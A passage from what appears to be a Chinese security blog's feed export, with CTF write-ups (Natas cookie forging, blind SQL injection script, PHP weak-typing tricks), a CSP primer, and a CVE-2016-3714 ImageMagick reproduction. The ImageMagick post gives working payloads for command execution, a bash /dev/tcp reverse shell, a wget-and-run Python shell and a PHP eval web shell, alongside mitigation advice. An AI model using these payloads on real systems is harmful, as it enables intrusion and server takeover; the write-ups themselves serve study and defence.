class="attr">style</span>=<span class="string">"background: &lt;?=$data['bgcolor']?&gt;;"</span>&gt;</span></div><div class="line">Cookies are protected with XOR encryption<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?</span></span></div><div class="line"><span class="keyword">if</span>($data[<span class="string">"showpassword"</span>] == <span class="string">"yes"</span>) &#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"The password for natas12 is &lt;censored&gt;&lt;br&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>审计发现是将$key与$defaultdata异或为Cookie[“data”],所以可以用cookie[“data”]与$defaultdata异或得到key：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$defaultdata = <span class="keyword">array</span>( <span class="string">"showpassword"</span>=&gt;<span class="string">"no"</span>, <span class="string">"bgcolor"</span>=&gt;<span class="string">"#ffffff"</span>);  </div><div class="line">$data= <span class="string">'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw='</span>;  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">($in,$out)</span> </span>&#123;  </div><div class="line">    $key =<span class="string">''</span> ;  </div><div class="line">    $text = $in;  </div><div class="line">  </div><div class="line">    <span class="comment">// Iterate through each character  </span></div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($text);$i++) &#123;  </div><div class="line">    <span class="comment">//$outText .= $text[$i] ^ $key[$i % strlen($key)];  </span></div><div class="line">    $key .= $text[$i] ^ $out[$i];  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="keyword">return</span> $key;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="keyword">echo</span> xor_encrypt(json_encode($defaultdata),base64_decode($data));  </div><div class="line">  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>得到key:<code>qw8j</code>然后用key与<code>&quot;showpassword&quot;=&gt;&quot;yes&quot;</code>的data异或得到cookie：<code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$data = <span class="string">''</span>;</div><div class="line">$in = json_encode(<span class="keyword">array</span>(<span class="string">"showpassword"</span>=&gt;<span class="string">"yes"</span>, <span class="string">"bgcolor"</span>=&gt;<span class="string">"#ffffff"</span>));</div><div class="line">$key = <span class="string">'qw8J'</span>;</div><div class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($in); $i++) &#123;</div><div class="line">	$data .= $in[$i] ^ $key[$i % strlen($key)];</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> base64_encode($data);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>带着cookie去访问得到下一关的key<br><img src="http://i4.buimg.com/567571/8e197f9871110ba9.png" alt=""></p>
<h2 id="natas13"><a href="#natas13" class="headerlink" title="natas13"></a>natas13</h2><p>URL:<code>http://natas13.natas.labs.overthewire.org/</code><br>Username:natas13<br>Password:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY<br>关键代码：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if (! exif<span class="emphasis">_imagetype($_</span>FILES[<span class="string">'uploadedfile'</span>][<span class="symbol">'tmp_name'</span>])) &#123;</div><div class="line"><span class="code">        echo "File is not an image"; </span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>exif_imagetype:判断文件头是否为图片格式<br><a href="http://www.2cto.com/article/201301/181968.html" target="_blank" rel="external">各种类型文件头特征码</a>在要上传的文件前加上jpg的文件头便可绕过</p>
<h2 id="natas15"><a href="#natas15" class="headerlink" title="natas15"></a>natas15</h2><p>URL:<code>http://natas15.natas.labs.overthewire.org/</code><br>Username:natas15<br>Password:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br>明显的盲注，先利用requests库的<code>requests.auth.HTTPBasicAuth</code>通过认证，盲注脚本：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from requests<span class="selector-class">.auth</span> import HTTPBasicAuth</div><div class="line">url=<span class="string">'http://natas15.natas.labs.overthewire.org/index.php'</span></div><div class="line">username = <span class="string">'natas15'</span></div><div class="line">password = <span class="string">'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'</span></div><div class="line">base = <span class="string">'0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></div><div class="line">passd = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> <span class="selector-tag">b</span> <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</div><div class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> base:</div><div class="line">        c = ord(i)</div><div class="line">        payload=&#123;<span class="string">'username'</span>:<span class="string">'natas16\" and ascii(mid(password,'</span>+str(b)+<span class="string">',1))='</span>+str(c)+<span class="string">'#'</span>&#125;</div><div class="line">        <span class="selector-id">#print</span> payload</div><div class="line">        a=requests.post(url,auth=requests<span class="selector-class">.auth</span><span class="selector-class">.HTTPBasicAuth</span>(username,password),data=payload)</div><div class="line">        <span class="keyword">if</span> <span class="string">'This user exists.'</span> <span class="keyword">in</span> <span class="selector-tag">a</span><span class="selector-class">.content</span>:</div><div class="line">            passd += <span class="selector-tag">i</span></div><div class="line">            print passd</div><div class="line">            break</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Write-up </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ImageMagick命令执行]]></title>
      <url>http://isron.cn/2017/03/29/CVE-2016-3714/</url>
      <content type="html"><![CDATA[<h2 id="什么是ImageMagick"><a href="#什么是ImageMagick" class="headerlink" title="什么是ImageMagick"></a>什么是ImageMagick</h2><p>　　ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。<a id="more"></a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ImageMagick在处理https文件时，会调用https委托：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">" &lt;delegate decode=<span class="subst">\"</span>https<span class="subst">\"</span> command=<span class="subst">\"</span>&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;<span class="subst">\"</span>/&gt;"</span></div></pre></td></tr></table></figure></p>
<p>具体详情：<a href="https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c" target="_blank" rel="external">Github</a><br>调用委托去下载相应的图片，如果我们传入<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://<span class="built_in">example</span>.com/<span class="built_in">image</span>.jpg<span class="string">"|ls -al"</span>`</div></pre></td></tr></table></figure></p>
<p>则底层运行的则是<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"wget"</span> -q -O <span class="string">"%o"</span> <span class="string">"https://example.com/image.jpg"</span>|<span class="keyword">ls</span> -<span class="keyword">al</span><span class="string">""</span></div></pre></td></tr></table></figure></p>
<p>成功执行<code>ls -al</code><br><img src="http://i2.muimg.com/567571/f6f52a44156df4f7.png" alt=""></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480<span class="built_in"></span></div><div class="line">fill 'url(https://<span class="string">"|id; "</span>)'</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
<ol>
<li>push和pop是用于堆栈的操作，一个进栈，一个出栈;</li>
<li>viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;</li>
<li>fill url()是把图片填充到当前元素内;</li>
</ol>
<h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><p>ImageMagick 6.9.3-9以前的所有版本</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>创建一个test.png文件，包含以下内容<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480<span class="built_in"></span></div><div class="line">fill 'url(https://example.com/image.jpg<span class="string">"|ls -al"</span>)'</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure></p>
<p>本地测试执行命令：<code>convert 1.png 2.png</code></p>
<h3 id="Shell反弹"><a href="#Shell反弹" class="headerlink" title="Shell反弹"></a>Shell反弹</h3><p>服务器开启端口监听：<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">nc</span> -lvp <span class="keyword">port</span> //<span class="keyword">port</span>需要为未被占用的端口</div></pre></td></tr></table></figure></p>
<p>test.png写入<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480<span class="built_in"></span></div><div class="line">fill 'url(https://example.com/image.jpg<span class="string">"|bash -i &gt;&amp; /dev/tcp/服务器ip/port 0&gt;&amp;1"</span>)'</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure></p>
<p>或者利用py反弹：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480<span class="built_in"></span></div><div class="line">fill 'url(https://example.com/image.jpg<span class="string">"|wget http://isron.cn/2017/03/29/CVE-2016-3714/shell.py -O /tmp/Isron.py &amp;&amp; python /tmp/Isron.py ip port"</span>)'</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure></p>
<h3 id="WebShell写入"><a href="#WebShell写入" class="headerlink" title="WebShell写入"></a>WebShell写入</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480<span class="built_in"></span></div><div class="line">fill 'url(https://example.com/1.jpg<span class="string">"|echo \\'&lt;?php eval($_POST[\\'Isron\\']);?&gt;\\' &gt; shell.php"</span>)'</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol>
<li>升级到最新版本</li>
<li>配置/etc/ImageMagick/policy.xml的方式来禁止https、mvg这些delegate,或者直接在配置文件删除相应的delegate</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">policymap</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"EPHEMERAL"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"URL"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"HTTPS"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"MVG"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"MSL"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">policymap</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="http://rcoil.me/2017/03/CVE-2016-3714/" target="_blank" rel="external">http://rcoil.me/2017/03/CVE-2016-3714/</a></li>
<li><a href="http://byd.dropsec.xyz/2016/10/02/ImageMagick命令执行漏洞浅析/" target="_blank" rel="external">http://byd.dropsec.xyz/2016/10/02/ImageMagick命令执行漏洞浅析/</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 漏洞复现 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP-弱类型]]></title>
      <url>http://isron.cn/2017/03/27/PHP-weak/</url>
      <content type="html"><![CDATA[<p>参加ZCTF线下时遇到一个关于php弱类型的题目<a id="more"></a><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$l01o=<span class="number">0</span>;</div><div class="line">$o1l0=<span class="number">0</span>;</div><div class="line">$o10l=<span class="number">0</span>;</div><div class="line">$lo10=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'vhghf'</span>])) <span class="comment">//GET传入一个vhghf</span></div><div class="line">&#123;</div><div class="line">        $vhghf = $_GET[<span class="string">'vhghf'</span>];</div><div class="line">        $vhghf==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果vhghf等于1则退出</span></div><div class="line">        <span class="keyword">switch</span> ($vhghf)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//如果vhghf等于1则$101o等于1</span></div><div class="line">                $l01o=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$dfgdf=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'dfgdf'</span>]); <span class="comment">//GET传入dfgdf且进行json_decode且创建一个数组</span></div><div class="line"><span class="keyword">if</span>(is_array($dfgdf))&#123;  <span class="comment">//如果为数组则进行接下来的</span></div><div class="line">    is_numeric(@$dfgdf[<span class="string">"gvnghdjk"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//判断dfgdf中的gvnghdjk是否为数字或数字字符串</span></div><div class="line">    <span class="keyword">if</span>(@$dfgdf[<span class="string">"gvnghdjk"</span>])&#123;</div><div class="line">        ($dfgdf[<span class="string">"gvnghdjk"</span>]&gt;<span class="number">2017</span>)?$o1l0=<span class="number">1</span>:<span class="keyword">NULL</span>; <span class="comment">//gvnghdjk大于2017</span></div><div class="line">         </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$dfgdf[<span class="string">"uxcndffznb"</span>]))&#123; <span class="comment">//uxcndffznb要为数组</span></div><div class="line">        <span class="keyword">if</span>(count($dfgdf[<span class="string">"uxcndffznb"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($dfgdf[<span class="string">"uxcndffznb"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); <span class="comment">//数组中有两个值，且第一个还要为数组</span></div><div class="line">        $kghdhfghdfgbcvhgffg = array_search(<span class="string">"ZCTF"</span>, $dfgdf[<span class="string">"uxcndffznb"</span>]); <span class="comment">//查询uxcndffznb中有没有ZCTF有则返回1没则返回false</span></div><div class="line">        $kghdhfghdfgbcvhgffg===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果为false则退出</span></div><div class="line">        <span class="keyword">foreach</span>($dfgdf[<span class="string">"uxcndffznb"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; <span class="comment">//查询uxcndffznb中是否有ZCTF如果有则退出</span></div><div class="line">            $val===<span class="string">"ZCTF"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $o10l=<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$cdggjydcnfsdyjaq = $_GET[<span class="string">'cdggjydcnfsdyjaq'</span>]; <span class="comment">//MD5碰撞</span></div><div class="line"><span class="keyword">if</span> ($cdggjydcnfsdyjaq != <span class="string">'15562'</span>) &#123;</div><div class="line">    <span class="keyword">if</span> (strstr($cdggjydcnfsdyjaq, <span class="string">'2017ZCTF'</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (substr(md5($cdggjydcnfsdyjaq),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</div><div class="line">            $lo10=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'flag'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>共有四个比较</p>
<h3 id="vhghf"><a href="#vhghf" class="headerlink" title="vhghf"></a>vhghf</h3><p><code>$vhghf==&quot;1&quot;?die(&quot;ha?&quot;):NULL;</code>将vhghf与1进行比较，而且是双等号，直接1+任意字母绕过。</p>
<h3 id="dfgdf-“gvnghdjk”"><a href="#dfgdf-“gvnghdjk”" class="headerlink" title="dfgdf[“gvnghdjk”]"></a>dfgdf[“gvnghdjk”]</h3><p><code>dfgdf[&quot;gvnghdjk&quot;]&gt;2017</code>与第一个相似，2018加任意字母绕过。</p>
<h3 id="dfgdf-“uxcndffznb”"><a href="#dfgdf-“uxcndffznb”" class="headerlink" title="$dfgdf[“uxcndffznb”]"></a>$dfgdf[“uxcndffznb”]</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$kghdhfghdfgbcvhgffg = array_search(<span class="string">"ZCTF"</span>, $dfgdf[<span class="string">"uxcndffznb"</span>]); <span class="comment">//查询uxcndffznb中有没有ZCTF有则返回1没则返回false</span></div><div class="line">$kghdhfghdfgbcvhgffg===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果为false则退出</span></div><div class="line"><span class="keyword">foreach</span>($dfgdf[<span class="string">"uxcndffznb"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; <span class="comment">//查询uxcndffznb中是否有ZCTF如果有则退出</span></div><div class="line">$val===<span class="string">"ZCTF"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>array_search是弱类型的比较，0双等于所有的无数字开头的字符串，可以用0去绕过array_search的比较</p>
<h3 id="cdggjydcnfsdyjaq"><a href="#cdggjydcnfsdyjaq" class="headerlink" title="cdggjydcnfsdyjaq"></a>cdggjydcnfsdyjaq</h3><p>MD5碰撞，线上赛有提及，0e+任意数字双等于0e+任意数字</p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Bypass_Csp]]></title>
      <url>http://isron.cn/2017/03/19/CSP/</url>
      <content type="html"><![CDATA[<h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP"></a>什么是CSP</h2><p>内容安全策略（Content Security Policy，简称CSP）是一种以可信白名单作机制，来限制网站中是否可以包含某来源内容。默认配置下不允许执行内联代码,用来减少XSS攻击。<a id="more"></a></p>
<h2 id="CSP语法"><a href="#CSP语法" class="headerlink" title="CSP语法"></a>CSP语法</h2><h3 id="CSP指令"><a href="#CSP指令" class="headerlink" title="CSP指令"></a>CSP指令</h3><table>
<thead>
<tr>
<th>指令</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>default-src</td>
<td>‘self’ cdn.example.com</td>
<td>定义对所有类型的默认加载策略，如果没有单独定义策略，就执行默认策略</td>
</tr>
<tr>
<td>script-src</td>
<td>‘self’ js.example.com</td>
<td>定义对js的加载策略</td>
</tr>
<tr>
<td>style-src</td>
<td>‘self’ css.example.com</td>
<td>定义对样式表的加载策略</td>
</tr>
<tr>
<td>img-src</td>
<td>‘self’ img.example.com</td>
<td>定义对图片的加载策略</td>
</tr>
<tr>
<td>connect-src</td>
<td>‘self’</td>
<td>针对Ajax/Websocket等请求的加载策略，不允许的情况下，浏览器会模拟一个状态为400的响应</td>
</tr>
<tr>
<td>font-src</td>
<td>font.example.com</td>
<td>定义对字体的加载策略</td>
</tr>
<tr>
<td>object-src</td>
<td>‘self’</td>
<td>定义对引用资源的加载策略，如<code>&lt;object&gt;&lt;embed&gt;&lt;applet&gt;</code>等</td>
</tr>
<tr>
<td>frame-src</td>
<td>‘self’</td>
<td>定义对frame的加载策略，建议改用child-src</td>
</tr>
<tr>
<td>media-src</td>
<td>media.example.com</td>
<td>定义对音频和视频的加载策略</td>
</tr>
</tbody>
</table>
<h3 id="CSP语法-1"><a href="#CSP语法-1" class="headerlink" title="CSP语法"></a>CSP语法</h3><table>
<thead>
<tr>
<th>指令值</th>
<th>指令示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>img-src *</td>
<td>允许加载所有资源</td>
</tr>
<tr>
<td>‘none’</td>
<td>img-src ‘none’</td>
<td>不允许加载一切资源</td>
</tr>
<tr>
<td>‘self’</td>
<td>img-src ‘self’</td>
<td>只允许加载同源的资源</td>
</tr>
<tr>
<td>data</td>
<td>img-src data</td>
<td>允许data:协议加载资源(如base64编码的图片)</td>
</tr>
<tr>
<td>www.a.com</td>
<td>img-src img.a.com</td>
<td>允许加载指定域名的资源</td>
</tr>
<tr>
<td>*.a.com</td>
<td>img-src *.a.com</td>
<td>允许加载a.com任何子域的资源</td>
</tr>
<tr>
<td><code>https://img.com</code></td>
<td>img-src <code>https://img.com</code></td>
<td>允许加载img.com的https资源</td>
</tr>
<tr>
<td>https:</td>
<td>img-src https:</td>
<td>允许加载https资源</td>
</tr>
<tr>
<td>‘unsafe-inline’</td>
<td>script-src ‘unsafe-inline’</td>
<td>允许加载inline资源(如常见的style属性，onclick，inline js和inline css等等)</td>
</tr>
<tr>
<td>‘unsafe-eval’</td>
<td>script-src ‘unsafe-eval’</td>
<td>允许加载动态js代码如 eval()函数</td>
</tr>
</tbody>
</table>
<h2 id="CSP例子"><a href="#CSP例子" class="headerlink" title="CSP例子"></a>CSP例子</h2><h3 id="只允许加载同源资源"><a href="#只允许加载同源资源" class="headerlink" title="只允许加载同源资源"></a>只允许加载同源资源</h3><figure class="highlight csp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">'self'</span></div></pre></td></tr></table></figure>
<h3 id="只加载同源的和子域的资源"><a href="#只加载同源的和子域的资源" class="headerlink" title="只加载同源的和子域的资源"></a>只加载同源的和子域的资源</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy: default-src <span class="string">'self'</span> *<span class="selector-class">.mydomain</span><span class="selector-class">.com</span></div></pre></td></tr></table></figure>
<h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><p>Github允许加载任何域的内容，但只能加载指定域的脚本，只能加载指定域的样式并可以执行内联样式，只能通过SSL加载指定域的flash插件<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy:default-src *; script-src <span class="string">'self'</span> <span class="keyword">https</span>://github.<span class="built_in">global</span>.ssl.fastly.net  <span class="keyword">https</span>://ssl.google-analytics.com <span class="keyword">https</span>://collector-cdn.github.com  <span class="keyword">https</span>://embed.github.com <span class="keyword">https</span>://raw.github.com; style-src <span class="string">'self'</span> <span class="string">'unsafe-inline'</span> <span class="keyword">https</span>://github.<span class="built_in">global</span>.ssl.fastly.net; object-src <span class="keyword">https</span>://github.<span class="built_in">global</span>.ssl.fastly.net</div></pre></td></tr></table></figure></p>
<h2 id="Bypass-Csp"><a href="#Bypass-Csp" class="headerlink" title="Bypass_Csp"></a>Bypass_Csp</h2><p>一种安全策略的出生，避免不了怎么想着去Bypass</p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSP </tag>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SHA1碰撞]]></title>
      <url>http://isron.cn/2017/03/17/SHA1/</url>
      <content type="html"><![CDATA[<p>在群里面看到这样一个题目<a id="more"></a><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line">    $name = (string)$_GET[<span class="string">'name'</span>];</div><div class="line">    $password = (string)$_GET[<span class="string">'password'</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($name == $password) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sha1($name) === sha1($password)) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">    &#125; <span 